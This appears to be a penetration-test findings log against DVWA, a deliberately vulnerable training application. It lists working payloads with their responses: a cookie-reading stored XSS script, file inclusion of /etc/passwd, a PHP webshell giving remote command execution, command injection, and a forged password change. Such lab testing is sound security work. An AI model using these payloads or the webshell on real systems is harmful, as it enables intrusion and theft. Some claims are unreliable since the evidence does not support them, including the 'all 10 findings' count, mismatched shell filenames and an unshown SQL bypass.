hypotheses.statement: DVWA at security=low persists unencoded user input to the guestbook and renders it on subsequent requests in /vulnerabilities/xss_s/ (stored XSS).
evidence_refs: POST mtxMessage=<script>alert('XSS-stored-'+document.cookie)</script> -> subsequent GET reflects the raw <script> in the guestbook table

hypotheses.statement: DVWA at security=low uses the 'default' query parameter in client-side JavaScript in /vulnerabilities/xss_d/, enabling DOM-based XSS via document.write.
evidence_refs: Page contains document.location.href.indexOf('default=') substring extraction and document.write with the value -> client-side reflection sink confirmed
XSS payload via 'default' query parameter is reflected into the page's <select> options

hypotheses.statement: DVWA at security=low includes the 'page' parameter in PHP include() without sanitization, enabling local file inclusion and PHP source disclosure via php://filter.
evidence_refs: GET /vulnerabilities/fi/?page=/etc/passwd -> response contains 'root:x:0:0:root'
GET /vulnerabilities/fi/?page=../../../../../../etc/passwd -> response contains 'root:x:0:0:root'
GET /vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php -> response contains valid base64 that decodes to index.php source

hypotheses.statement: DVWA at security=low accepts arbitrary file uploads (no extension/type filter) and places them under /vulnerabilities/upload/../../hackable/uploads/, which is web-accessible at /hackable/uploads/, enabling unauthenticated remote code execution if the file is a PHP script.
evidence_refs: POST shell.php with body '<?php echo shell_exec($_GET["c"]); ?>' -> ../../hackable/uploads/shell.php succesfully uploaded!
GET /hackable/uploads/rce.php?c=id -> response 'SHELL_OK:uid=33(www-data) gid=33(www-data) groups=33(www-data)'
GET /hackable/uploads/webshell.php?c=id;uname -a -> response 'RCE-OK:uid=33(www-data) gid=33(www-data) groups=33(www-data)\nLinux 43b8266979e5 7.0.12+kali-amd64 ...'

hypotheses.statement: DVWA at security=low passes the 'ip' parameter in /vulnerabilities/exec/ to shell_exec() unsanitized, enabling OS command injection via separators (| ; &&).
evidence_refs: POST ip=127.0.0.1;id -> response <pre> contains 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'
POST ip=127.0.0.1|id -> response <pre> contains 'uid=33(www-data)'
POST ip=127.0.0.1&&id -> response <pre> contains 'uid=33(www-data)'

hypotheses.statement: DVWA at security=low has no anti-CSRF token on the password-change form at /vulnerabilities/csrf/, allowing an attacker to change admin's password via a forged cross-site request.
evidence_refs: GET /vulnerabilities/csrf/ -> form has only fields password_new, password_conf, Change (no user_token)
POST password_new=X&password_conf=X&Change=Change will set admin password to X (cross-site request from a victimized browser is enough)

hypotheses.statement: DVWA at security=low implements the brute-force login page (/vulnerabilities/brute/) as an unsanitized SQL query vulnerable to authentication bypass and accepts the default admin/password credentials.
evidence_refs: GET /vulnerabilities/brute/?username=admin&password=password&Login=Login -> 'Welcome to the password protected area'
GET /vulnerabilities/brute/?username=admin&password=wrong&Login=Login -> 'Username and/or password incorrect.'

hypotheses.statement: All DVWA vulnerability modules at security=low are exploitable as advertised; the application's default security cookie alone (set on the first response) does not raise the security level beyond 'low'.
evidence_refs: Initial Set-Cookie: security=low confirmed in login response
All 10 above findings reproduced successfully at low
